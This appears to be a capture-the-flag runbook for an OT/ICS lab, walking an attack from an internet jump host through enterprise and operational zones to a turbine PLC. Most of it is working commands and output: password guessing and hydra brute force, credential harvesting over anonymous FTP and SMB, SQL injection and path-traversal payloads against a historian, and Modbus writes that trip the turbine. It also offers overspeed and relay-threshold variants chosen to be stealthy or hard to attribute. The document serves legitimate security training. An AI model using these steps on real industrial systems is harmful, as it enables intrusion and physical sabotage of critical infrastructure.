# Runbook: Internet to turbine trip

Four-zone attack chain from jump-host entry to turbine emergency stop. Covers initial
access, lateral movement through three network boundaries, credential exfiltration,
process recon, and state manipulation.

- Techniques: 
  - [Credential attacks and authentication abuse](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#credential-attacks-and-authentication-abuse)
  - [Trust exploitation and misconfiguration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#trust-exploitation-and-misconfiguration-abuse)
  - [IT/OT boundary crossing](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#initial-access-and-lateral-movement-through-the-it-ot-boundary)
  - [Data exfiltration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#data-exfiltration)
  - [Process intelligence gathering](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#process-intelligence-gathering)
  - [Unauthorised state manipulation](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#unauthorised-state-manipulation)
- Challenge type: Realist
- Difficulty: Advanced

## Components to start

```bash
./ctl up
sudo ./ctl firewall
```

Minimal containers: `unseen-gate`, `wizzards-retreat`, `hex-legacy-1`, `bursar-desk`,
`uupl-historian`, `uupl-eng-ws`, `hex-turbine-plc`

The firewall is required; without it the enterprise and operational zones are directly
reachable from the internet and the pivot chain collapses into a single hop.

Participant entry point: SSH to `unseen-gate`. For local testing the SSH port is mapped
to host port 2222 by default:

```bash
./ctl ssh ponder
# or: ssh ponder@localhost -p 2222
```

For Hetzner deployment, run `setup.sh` first to move the host sshd to port 2222, then
set `attacker_machine.ssh_host_port: 22` in `ctf-config.yaml` before `./ctl up`.

## Attack path

### Stage 0: initial access, unseen-gate to wizzards-retreat

```bash
# Read the briefing on unseen-gate
cat /run/adversary-readme.txt
# Enterprise network: 10.10.1.0/24. Admin at home: 10.10.0.10.

# wizzards-retreat is on the internet at 10.10.0.10
# Three simultaneous entry paths:

# Path A: SSH with weak password (fastest)
ssh rincewind@10.10.0.10
# Password: wizzard

# Path B: HTTP status endpoint (recon only, no shell)
curl -u admin:admin http://10.10.0.10/status

# Path C: brute force
hydra -l rincewind -P /usr/share/wordlists/rockyou.txt ssh://10.10.0.10

# Primary loot on wizzards-retreat
cat ~/notes.txt
# historian URL, SCADA URL, enterprise IPs
cat ~/.ssh-keys/uupl_eng_key
# Ed25519 private key for engineer@10.10.2.30
cat ~/.vpn/uupl-vpn.conf
# WireGuard config confirming enterprise and operational AllowedIPs (cosmetic)
```

### Stage 1: enterprise recon, wizzards-retreat to legacy workstation

```bash
# wizzards-retreat has enterprise NIC at 10.10.1.3
# Scan enterprise segment
nmap -sV 10.10.1.10 10.10.1.20
# 10.10.1.10: 21/ftp  22/ssh  23/telnet  139/smb  445/smb
# 10.10.1.20: 22/ssh

# Legacy workstation: anonymous FTP exposes all credentials
ftp 10.10.1.10
> Name: anonymous
> Password: (blank)
> cd UUPL
> get NETWORK.TXT
> cd ../LOGBOOK
> get ENGINEER.LOG
> quit

# NETWORK.TXT: full IP inventory for historian, SCADA, engineering workstation
# ENGINEER.LOG: all system passwords in plaintext
# Includes: bursardesk / Octavo1, engineer / spanner99, hist_admin / Historian2015

# SMB guest access returns the same files
smbclient //10.10.1.10/public -N
```

### Stage 2: enterprise workstation, credential harvest and operational pivot

```bash
# SSH to bursar-desk from wizzards-retreat's enterprise NIC
ssh bursardesk@10.10.1.20
# Password: Octavo1

# Collect operational credentials
type AppData\Roaming\UUPLOps\ops-access.conf
# historian_host=10.10.2.10
# historian_user=hist_admin
# historian_pass=Historian2015
# scada_url=http://10.10.2.20:8080
# scada_user=admin
# scada_pass=admin

# PowerShell history contains the same historian credentials encoded in Base64
type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# bursar-desk is dual-homed: operational NIC at 10.10.2.100
# No further pivot needed to reach historian
```

### Stage 3: historian, SQL injection and alarm threshold exfiltration

```bash
# From bursar-desk (10.10.2.100 has direct operational zone access)
curl http://10.10.2.10:8080/assets
# ["turbine_main","relay_a","relay_b","meter"]

# SQL injection on /report: enumerate tables
curl "http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+name,sql,'x'+FROM+sqlite_master--&from=0&to=9"

# Read alarm thresholds: exact values needed to disable relay protection silently
curl "http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+asset,hi_hi,unit+FROM+alarm_config--&from=0&to=9"
# turbine_rpm | 3300 | RPM     <- overspeed threshold
# relay_a_oc  | 150  | A       <- overcurrent threshold
# relay_a_uv  | 195  | V       <- undervoltage threshold

# Recover SSH credentials from config table
curl "http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+key,value,'x'+FROM+config--&from=0&to=9"
# ssh_pass | Historian2015 | ...

# SSH to historian for interactive shell
ssh hist_admin@10.10.2.10
# Password: Historian2015

# Path traversal: download the full database for offline analysis
curl "http://10.10.2.10:8080/export?tag=../historian.db" -o historian.db
sqlite3 historian.db "SELECT * FROM alarm_config;"
```

### Stage 4: engineering workstation, control zone access

```bash
# Option A: use the Ed25519 key collected from wizzards-retreat in Stage 0
# (copy the key off wizzards-retreat first via scp or cat)
ssh -i uupl_eng_key engineer@10.10.2.30

# Option B: password from ENGINEER.LOG
ssh engineer@10.10.2.30
# Password: spanner99

# Collect control zone credentials
type config\plc-access.conf
# PLC:     10.10.3.21  turbineadmin
# relay_a: 10.10.3.31  admin / relay1234
# relay_b: 10.10.3.32  admin / relay1234
# Notes: Modbus has no authentication, credentials not actually needed

# Check cron log to confirm PLC is reachable
cat /home/engineer/plc_poll.log
# Most recent governor setpoint poll: confirms PLC is up

# engineering workstation has control NIC at 10.10.3.100
# All control zone devices are directly reachable
```

### Stage 5: turbine PLC, process recon and emergency stop

```bash
# From engineering workstation, control zone NIC at 10.10.3.100
cd C:\Users\engineer\Tools

# Read live turbine state
/venv/bin/python3 modbus_read.py 10.10.3.21 502 input 0 11
# [2987, 312, 87, 231, 229, 148, 147, 500, 68000, 43, 12]
# IR[0]=RPM  IR[1]=temp_C  IR[2]=pressure_bar  IR[3]=voltage_a  ...

# Read governor setpoint and emergency stop status
/venv/bin/python3 modbus_read.py 10.10.3.21 502 holding 0 4
# [3000, 45, 0, 200]  HR[0]=setpoint  HR[1]=fuel_valve%  HR[2]=cooling%  HR[3]=oc_threshold

/venv/bin/python3 modbus_read.py 10.10.3.21 502 coil 0 1
# [False]: estop not active

# Emergency stop: immediate trip, no warning
/venv/bin/python3 modbus_write.py 10.10.3.21 502 coil 0 1

# Confirm trip
/venv/bin/python3 modbus_read.py 10.10.3.21 502 coil 0 1
# [True]: estop active

# Alternatively: overspeed trip (stealthier, looks like a protection event)
/venv/bin/python3 modbus_write.py 10.10.3.21 502 holding 0 4000
# Governor setpoint raised to 4000 RPM: above 3300 RPM overspeed threshold
# Turbine accelerates until protection fires automatically
```

## Flag placement

Modify `zones/control/components/turbine-plc/plc_server.py`: in the emergency stop
handler, write the flag value to IR[10] (the vibration register, unused under normal
conditions). The flag appears only after the estop fires.

Read it with:
```bash
/venv/bin/python3 modbus_read.py 10.10.3.21 502 input 10 1
```

In `ctf-config.yaml`, set an environment variable `CTF_FLAG=RM{...}` and read it in
`plc_server.py` to avoid hardcoding the flag value in source.

## Why most OT attacks start in IT

The turbine PLC is unreachable until Stage 4. Every step before that is IT
infrastructure: a home admin's weak password, legacy protocols on a 1990s workstation,
credential reuse, and plaintext configuration files. The OT component is the last 30
seconds of a multi-hour operation.

The ICS-CERT advisory ICSA-10-090-01 and the Ukraine 2015 BlackEnergy incident follow
exactly this pattern. The control network boundary holds. The IT network does not.

## Variant: relay threshold manipulation instead of estop

Replace the turbine estop with relay threshold write: set `HR[2]` on relay-a to 0 via
Modbus (`write_holding_register(2, 0, slave=1)` on 10.10.3.31). The overcurrent
threshold drops to zero; the relay trips on any measurable current. The turbine is
now isolated by a protection device working as designed, triggered by a value an
attacker wrote. The impact is subtler and harder to attribute than an estop.